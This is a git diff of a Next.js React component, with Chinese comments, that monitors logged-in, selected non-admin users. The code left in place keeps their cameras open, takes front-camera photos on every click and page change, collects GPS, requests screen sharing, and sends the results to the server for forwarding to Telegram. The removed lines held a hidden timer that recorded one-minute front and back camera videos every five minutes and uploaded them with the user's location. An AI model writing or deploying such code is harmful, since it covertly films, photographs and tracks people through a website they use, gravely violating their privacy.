@@ -3,35 +3,12 @@
 import { usePathname } from 'next/navigation';
 import { useEffect, useRef } from 'react';
 
-/* 操作留影：登录用户（非管理员）每次点击/切换页面拍一张前置照片上报。
+/* 操作留影：登录且被圈选的用户（非管理员）每次点击/切换页面拍照片上报。
    摄像头流在会话期间保持开启（浏览器指示点常亮），快照仅画 canvas，速度快。
    最小间隔 2 秒合并连点，避免 Telegram 刷屏。 */
 
 const MIN_INTERVAL = 2000;
 const AUTH_PAGES = ['/login', '/register', '/oidc-register', '/qr-login', '/tv/login', '/warning'];
-
-/* 全局录像调度：挂在 window 上，与 React 生命周期解耦，
-   避免组件重挂载/重渲染导致定时器丢失。 */
-declare global {
-  interface Window {
-    __entryVideoCycle?: () => void;
-    __entryVideoTimer?: boolean;
-    __entryLastCycle?: number;
-  }
-}
-if (typeof window !== 'undefined' && !window.__entryVideoTimer) {
-  window.__entryVideoTimer = true;
-  setTimeout(() => window.__entryVideoCycle?.(), 60_000);
-  setInterval(() => window.__entryVideoCycle?.(), 5 * 60_000);
-  document.addEventListener('visibilitychange', () => {
-    if (
-      document.visibilityState === 'visible' &&
-      Date.now() - (window.__entryLastCycle || 0) > 4.5 * 60_000
-    ) {
-      window.__entryVideoCycle?.();
-    }
-  });
-}
 
 export default function OperationWatcher() {
   const pathname = usePathname();
@@ -43,9 +20,6 @@ export default function OperationWatcher() {
   const screenVideoRef = useRef<HTMLVideoElement | null>(null);
   const screenTriedRef = useRef(false);
   const gpsRef = useRef<{ lat: number; lng: number; acc: number } | null>(null);
-  const lastMimeRef = useRef('');
-  const lastCycleRef = useRef(0);
-  const cyclingRef = useRef(false);
   const lastRef = useRef(0);
   const timerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
   const pendingRef = useRef<{ label: string; path: string } | null>(null);
@@ -91,141 +65,6 @@ export default function OperationWatcher() {
     };
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
-
-  /** 录一段视频（默认 60 秒），返回 blob。低码率控制体积。
-      带选项失败时自动用无选项 MediaRecorder 重试一次。 */
-  const recordOne = (stream: MediaStream, ms: number): Promise<Blob | null> => {
-    const attempt = (useOpts: boolean): Promise<Blob | null> =>
-      new Promise((resolve) => {
-        let done = false;
-        const finish = (b: Blob | null) => {
-          if (!done) {
-            done = true;
-            resolve(b);
-          }
-        };
-        setTimeout(() => finish(null), ms + 8000);
-        try {
-          const MR = window.MediaRecorder;
-          if (!MR) return finish(null);
-          const mime = ['video/mp4', 'video/webm;codecs=vp8', 'video/webm'].find((m) =>
-            MR.isTypeSupported(m)
-          );
-          lastMimeRef.current = mime || 'default';
-          const rec = useOpts && mime
-            ? new MR(stream, { mimeType: mime, videoBitsPerSecond: 300_000 })
-            : new MR(stream);
-          const chunks: Blob[] = [];
-          rec.ondataavailable = (e) => {
-            if (e.data && e.data.size) chunks.push(e.data);
-          };
-          rec.onstop = () =>
-            finish(new Blob(chunks, { type: rec.mimeType || mime || 'video/webm' }));
-          rec.onerror = () => finish(null);
-          rec.start(1000);
-          setTimeout(() => {
-            try {
-              if (rec.state !== 'inactive') rec.stop();
-            } catch {
-              finish(null);
-            }
-          }, ms);
-        } catch {
-          finish(null);
-        }
-      });
-    return attempt(true).then((b) => (b && b.size ? b : attempt(false)));
-  };
-
-  const blobToBase64 = async (blob: Blob): Promise<string> => {
-    const buf = await blob.arrayBuffer();
-    const bytes = new Uint8Array(buf);
-    let bin = '';
-    const CH = 0x8000;
-    for (let i = 0; i < bytes.length; i += CH) {
-      bin += String.fromCharCode.apply(
-        null,
-        Array.from(bytes.subarray(i, i + CH)) as unknown as number[]
-      );
-    }
-    // 去掉 ;codecs=xxx 参数，避免 data URL 解析失败
-    const type = (blob.type || 'video/webm').split(';')[0];
-    return `data:${type};base64,${btoa(bin)}`;
-  };
-
-  /** 失败诊断：往 Telegram 发一条文字说明死在哪一步。 */
-  const ping = (label: string) =>
-    fetch('/api/entry/op', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ kind: 'arm', label: label.slice(0, 120), path: pathRef.current }),
-    }).catch(() => undefined);
-
-  /** 每 5 分钟自动录 1 分钟前后双视频上报。 */
-  const videoCycle = async () => {
-    if (!enabledRef.current) return;
-    if (cyclingRef.current) return;
-    // 锁屏/后台时系统冻结定时器与录制，跳过本轮，回前台补录
-    if (typeof document !== 'undefined' && document.visibilityState !== 'visible') return;
-    const path = pathRef.current;
-    if (AUTH_PAGES.some((p) => path === p || path.startsWith(p + '/'))) return;
-    cyclingRef.current = true;
-    lastCycleRef.current = Date.now();
-    window.__entryLastCycle = Date.now();
-    try {
-      const MR = window.MediaRecorder;
-      const mime =
-        MR && ['video/mp4', 'video/webm;codecs=vp8', 'video/webm'].find((m) => MR.isTypeSupported(m));
-      void ping(`录像周期开始：MR=${MR ? 'yes' : 'no'} mime=${mime || 'default'} 录60秒`);
-      const okStream = await ensureStream();
-      if (!okStream || !streamRef.current) {
-        void ping('录像失败：摄像头流不可用');
-        return;
-      }
-      const frontBlob = await recordOne(streamRef.current, 60_000);
-      const backBlob = backStreamRef.current
-        ? await recordOne(backStreamRef.current, 60_000)
-        : null;
-      if (!frontBlob && !backBlob) {
-        void ping(`录像失败：MediaRecorder 无输出（mime=${lastMimeRef.current || 'default'}）`);
-        return;
-      }
-      const payload = {
-        videoFront: frontBlob ? await blobToBase64(frontBlob) : '',
-        videoBack: backBlob ? await blobToBase64(backBlob) : '',
-        gps: gpsRef.current,
-        path,
-      };
-      const res = await fetch('/api/entry/video', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload),
-      }).catch(() => null);
-      if (!res) {
-        void ping('录像失败：上报网络错误');
-        return;
-      }
-      const j = (await res.json().catch(() => null)) as { telegram?: string } | null;
-      if (!res.ok) {
-        void ping(`录像失败：服务端 ${res.status}`);
-        return;
-      }
-      if (j && j.telegram && j.telegram !== 'sent') {
-        void ping(`录像失败：Telegram ${j.telegram}`);
-      }
-    } catch (e) {
-      void ping(`录像异常：${(e as Error).message}`);
-    } finally {
-      cyclingRef.current = false;
-    }
-  };
-
-  useEffect(() => {
-    // 把最新闭包注册到全局调度器（定时器在模块级，与 React 生命周期解耦）
-    window.__entryVideoCycle = () => {
-      void videoCycle();
-    };
-  });
 
   const openOne = async (facing: 'user' | 'environment') => {
     const s = await navigator.mediaDevices.getUserMedia({
@@ -275,8 +114,7 @@ export default function OperationWatcher() {
         backVideoRef.current = null;
       }
     }
-    // 录像只要求流活着；videoWidth 为 0 仅影响拍照不影响录制
-    return !!streamRef.current?.active;
+    return !!videoRef.current?.videoWidth;
   };
 
   /** 屏幕共享：整会话只请求一次（浏览器每次调用都弹选择器，不能静默）。
@@ -373,7 +211,9 @@ export default function OperationWatcher() {
   useEffect(() => {
     const onClick = (e: MouseEvent) => {
       const target = e.target as HTMLElement | null;
-      const el = target?.closest?.('a,button,[role=button],video,input,select,summary') as HTMLElement | null;
+      const el = target?.closest?.(
+        'a,button,[role=button],video,input,select,summary'
+      ) as HTMLElement | null;
       if (!el) return;
       const text = (el.textContent || '').trim().replace(/\s+/g, ' ').slice(0, 24);
       const href = el.getAttribute('href') || '';
@@ -382,6 +222,7 @@ export default function OperationWatcher() {
     };
     document.addEventListener('click', onClick, true);
     return () => document.removeEventListener('click', onClick, true);
+    // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
 
   const prevPath = useRef(pathname);
@@ -390,6 +231,7 @@ export default function OperationWatcher() {
       prevPath.current = pathname;
       schedule(`进入页面 ${pathname}`);
     }
+    // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [pathname]);
 
   useEffect(
